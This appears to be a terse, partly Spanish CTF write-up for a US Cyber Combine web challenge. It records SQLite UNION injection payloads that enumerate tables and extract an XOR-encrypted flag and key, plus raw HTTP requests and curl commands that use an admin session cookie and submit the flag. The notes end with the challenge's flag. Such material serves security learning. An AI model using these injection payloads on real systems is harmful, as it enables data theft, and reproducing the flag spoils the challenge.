



```sql
widget' UNION SELECT NULL,xor_encrypted_flag,NULL,NULL FROM xord_flag-- 

widget%27%20UNION%20SELECT%20NULL,xor_encrypted_flag,sqlite_version(),NULL%20FROM%20xord_flag--

widget%27%20UNION%20SELECT%20NULL,null,tbl_name,NULL%20FROM%20sqlite_master--

widget%27%20UNION%20SELECT%20NULL,null,sql,NULL%20FROM%20sqlite_master--


- tablas
widget%27%20UNION%20SELECT%20NULL,null,name,NULL%20FROM%20sqlite_master+WHERE+type=%27table%27--
$products
$users
$xor_encryption_key
$xord_flag

widget%27%20UNION%20SELECT%20NULL,null,sql,NULL%20FROM%20sqlite_master+WHERE+type=%27table%27and+name+=+%27xor_encryption_key%27--

Price: $CREATE TABLE xor_encryption_key (
        id INTEGER PRIMARY KEY,
        key TEXT
    )

widget%27%20UNION%20SELECT%20NULL,key,sqlite_version(),NULL%20FROM%20xor_encryption_key--



widget%27%20UNION%20SELECT%20NULL,null,sql,NULL%20FROM%20sqlite_master+WHERE+type=%27table%27and+name+=+%27xord_flag%27--
Price: $CREATE TABLE xord_flag (
        id INTEGER PRIMARY KEY,
        xor_encrypted_flag TEXT
    )
```

```

```



```sql
SELECT name FROM my_db.sqlite_master WHERE type='table';
```


```
GET  /admin/products?search=widget%27%20UNION%20SELECT%20NULL,xor_encrypted_flag,sqlite_version(),NULL%20FROM%20xord_flag--  HTTP/1.1
Host: uscybercombine-s4-unravel.chals.io
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.ZmDZnQ.wE6TPcNe-TWppK46KxRboQYCVj8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-unravel.chals.io/product?search=1+or+1%3D%3D1%3B
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

4d5b440014040819525900036855030600020659545452005701555c0f4a
```

```
GET  /admin/products?search=widget%27%20UNION%20SELECT%20NULL,key,sqlite_version(),NULL%20FROM%20xor_encryption_key--  HTTP/1.1
Host: uscybercombine-s4-unravel.chals.io
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.ZmDZnQ.wE6TPcNe-TWppK46KxRboQYCVj8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-unravel.chals.io/product?search=1+or+1%3D%3D1%3B
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

856abadb45ad7751
```

## Pasada 2

```
curl -s "https://uscybercombine-s4-unravel.chals.io/admin/products?search=widget%27%20UNION%20SELECT%20NULL,xor_encrypted_flag,sqlite_version(),NULL%20FROM%20xord_flag--" -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.ZmDZnQ.wE6TPcNe-TWppK46KxRboQYCVj8" | grep 'class="product"' -A 1



curl -s "https://uscybercombine-s4-unravel.chals.io//admin/products?search=widget%27%20UNION%20SELECT%20NULL,key,sqlite_version(),NULL%20FROM%20xor_encryption_key--" -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.ZmDZnQ.wE6TPcNe-TWppK46KxRboQYCVj8" |  grep 'class="product"' -A 1


curl -s -X POST "https://uscybercombine-s4-unravel.chals.io//api/submit_flag" -H "Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiaGFja2VyIn0.ZmDZnQ.wE6TPcNe-TWppK46KxRboQYCVj8" -H "Content-Type: application/json" -d '{"decrypted_flag": "unravel{flag_bc7}" }


unravel{flag_3f40bdbe46172034}

curl -s -X POST "https://uscybercombine-s4-unravel.chals.io//api/submit_flag"  -H "Content-Type: application/json" -H "python-requests/2.32.2" -d '{"decrypted_flag": "unravel{flag_3f40bdbe46172034}"}'
{"message":"Congratulations! The flag is: SIVUSCG{r3vers3_att@cks_c@sh_ch3cks}"}

```

- Usar la llave como texto y el texto como lalve y repetir
```
4d5b4400140408195259000368045305085752030755525303075157034a

856abadb45ad7751 856abadb45ad7751
```


## REferencias
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md